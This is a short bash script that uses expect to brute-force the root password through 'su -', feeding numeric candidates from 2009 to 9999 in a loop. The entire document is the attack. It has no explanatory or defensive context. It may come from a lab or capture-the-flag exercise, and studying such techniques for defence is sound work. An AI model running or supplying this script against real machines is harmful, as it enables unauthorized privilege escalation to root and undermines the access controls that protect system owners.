#!/bin/bash
n=9999
for ((i=2009; i<=n; i++)); do
    expect <<EOF
    spawn su -
    expect "Password:"
    send "$i\r"
    expect eof
EOF
done
